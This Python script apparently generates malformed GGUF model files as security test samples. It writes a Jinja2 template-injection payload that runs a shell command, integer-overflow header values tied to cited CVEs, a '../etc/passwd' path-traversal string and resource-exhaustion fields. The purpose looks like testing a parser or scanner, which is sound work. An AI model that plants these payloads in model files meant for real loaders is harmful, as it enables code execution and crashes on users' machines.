
"""Create proper GGUF exploit samples for testing."""

import struct
import os

output_dir = 'sample/malicious_samples_v2'
os.makedirs(output_dir, exist_ok=True)


def create_base_gguf():
    """Create a minimal valid GGUF file structure."""
    # GGUF Header: Magic(4) + Version(4) + n_tensors(8) + n_kv(8) = 24 bytes
    magic = b'GGUF'
    version = struct.pack('<I', 3)  # Version 3
    n_tensors = struct.pack('<Q', 1)  # 1 tensor
    n_kv = struct.pack('<Q', 1)  # 1 metadata entry
    
    # Metadata entry: key_len(8) + key + type(4) + value
    key = b'general.name'
    key_len = struct.pack('<Q', len(key))
    value_type = struct.pack('<I', 8)  # String type
    value = b'test_model'
    value_len = struct.pack('<Q', len(value))
    
    # Tensor info: name_len(8) + name + n_dims(4) + dims(8*n) + type(4) + offset(8)
    tensor_name = b'weight'
    tensor_name_len = struct.pack('<Q', len(tensor_name))
    n_dims = struct.pack('<I', 2)
    dim1 = struct.pack('<Q', 4)
    dim2 = struct.pack('<Q', 4)
    tensor_type = struct.pack('<I', 0)  # F32
    tensor_offset = struct.pack('<Q', 0)
    
    base = (
        magic + version + n_tensors + n_kv +
        key_len + key + value_type + value_len + value +
        tensor_name_len + tensor_name + n_dims + dim1 + dim2 + tensor_type + tensor_offset
    )
    
    # Add padding
    base += b'\x00' * 1024
    return bytearray(base)


def save(name, content):
    with open(os.path.join(output_dir, name), 'wb') as f:
        f.write(content)
    print(f'Created: {name}')


# 1. RCE: Jinja2 SSTI (CVE-2024-25123)
ssti = create_base_gguf()
ssti_payload = b'{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").system("whoami")}}{% endif %}{% endfor %}'
insert_pos = 100
ssti[insert_pos:insert_pos+len(ssti_payload)] = ssti_payload
save('exploit_01_rce_jinja_ssti.gguf', ssti)

# 2. CVE-2024-21836: n_tensors integer overflow
tensor_overflow = create_base_gguf()
tensor_overflow[8:16] = struct.pack('<Q', 0x1D1D1D1D1D1D1D1D)
save('exploit_02_tensor_overflow_cve21836.gguf', tensor_overflow)

# 3. CVE-2024-21802: n_dims overflow (n_dims = 255 > GGML_MAX_DIMS=4)
dim_overflow = create_base_gguf()
n_dims_offset = dim_overflow.find(b'weight') + len(b'weight')
dim_overflow[n_dims_offset:n_dims_offset+4] = struct.pack('<I', 255)
save('exploit_03_dimension_overflow_cve21802.gguf', dim_overflow)

# 4. Signed/Unsigned conversion exploit (INT32_MAX + 1 = 2147483649)
token_exploit = create_base_gguf()
token_exploit[24:32] = struct.pack('<Q', 2147483649)  # Becomes negative in int32
save('exploit_04_token_memcpy_signed.gguf', token_exploit)

# 5. DoS: KV count exhaustion (max uint64)
kv_dos = create_base_gguf()
kv_dos[16:24] = struct.pack('<Q', 0xFFFFFFFFFFFFFFFF)
save('exploit_05_kv_dos_exhaustion.gguf', kv_dos)

# 6. Path traversal in metadata
path_trav = create_base_gguf()
traversal = b'../../../../etc/passwd'
path_trav[50:50+len(traversal)] = traversal
save('exploit_06_path_traversal.gguf', path_trav)

# 7. Bad version (DEADBEEF)
bad_ver = create_base_gguf()
bad_ver[4:8] = struct.pack('<I', 0xDEADBEEF)
save('exploit_07_bad_version_deadbeef.gguf', bad_ver)

# 8. Maximum uint64 in string length (buffer overflow)
max_uint = create_base_gguf()
max_uint[24:32] = struct.pack('<Q', 0xFFFFFFFFFFFFFFFF)
save('exploit_08_max_uint64_length.gguf', max_uint)

# 9. CAFEBABE version marker
cafe = create_base_gguf()
cafe[4:8] = struct.pack('<I', 0xCAFEBABE)
save('exploit_09_cafebabe_version.gguf', cafe)

# 10. INT32_MAX in length field
int32max = create_base_gguf()
int32max[24:32] = struct.pack('<Q', 0x7FFFFFFF)
save('exploit_10_int32max_length.gguf', int32max)

print()
print(f'Created 10 exploit samples in {output_dir}/')
print()
print('Exploit samples:')
print('  01: Jinja2 SSTI RCE (CVE-2024-25123)')
print('  02: Tensor count overflow (CVE-2024-21836)')
print('  03: Dimension overflow (CVE-2024-21802)')
print('  04: Signed/unsigned conversion exploit')
print('  05: KV count DoS exhaustion')
print('  06: Path traversal in metadata')
print('  07: DEADBEEF version corruption')
print('  08: Max uint64 buffer overflow')
print('  09: CAFEBABE version marker')
print('  10: INT32_MAX length exploit')
